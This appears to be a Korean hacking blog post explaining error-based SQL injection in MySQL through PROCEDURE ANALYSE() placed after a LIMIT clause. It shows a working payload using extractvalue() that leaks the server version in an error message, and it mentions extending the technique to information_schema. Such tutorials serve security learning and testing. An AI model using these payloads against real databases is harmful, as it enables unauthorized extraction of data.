---
layout: post
title: Procedure analyse()를 이용한 SQL Injection
date: 2015-09-07 10:52:00 +0900
category: Hacking 
---


```mysql
 [LIMIT {[offset,] row_count | row_count OFFSET offset}]
    [PROCEDURE procedure_name(argument_list)]
    [INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        export_options
      | INTO DUMPFILE 'file_name'
      | INTO var_name [, var_name]]
    [FOR UPDATE | LOCK IN SHARE MODE]]

```

limit 절 뒤에 사용가능한 함수는 그리 많지 않습니다. 그중에서도 SQL Injection에 쓰이는것은

procedure analyse()라는 함수입니다. 이 함수는 현재 실행중인 컬럼에 대한 정보를 사용가능하게 해줍니다.



이 함수를 이용하면 



```mysql

mysql> select * from user where id='admin' limit 1 procedure analyse();

+--------------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+------+------------------

------+

| Field_name         | Min_value | Max_value | Min_length | Max_length | Empties_or_zeros | Nulls | Avg_value_or_avg_length | Std  | Optimal_fieldtype

      |

+--------------------+-----------+-----------+------------+------------+------------------+-------+-------------------------+------+------------------

------+

| user.user.id       | admin     | admin     |          5 |          5 |                0 |     0 | 5.0000                  | NULL | ENUM('admin') NOT

 NULL |



```

좀 깨졌지만 이렇게 컬럼의 정보에 대해서 알 수 있다.





이렇게 현재 컬럼의 테이블명과 기타 정보들이 노출됩니다.

하지만 저 procedure analyse()함수 안에서도 다른 값을 뽑아낼 수 있습니다.



그중에서 사용되는 함수는 다양하지만 

extractvalue()라는 함수가 있습니다.




```mysql
mysql> SELECT * FROM user WHERE id='admin' limit 1 procedure analyse(extractvalue(1,concat(0x3a,version())),1);
ERROR 1105 (HY000): XPATH syntax error: ':5.1.41-community'
mysql>
```



이렇게 하면 version을 뽑을 수 있습니다.

그 외에도 information_schema에 접근하여 DB와 테이블명에 대해서도 뽑아 올 수 있습니다. 



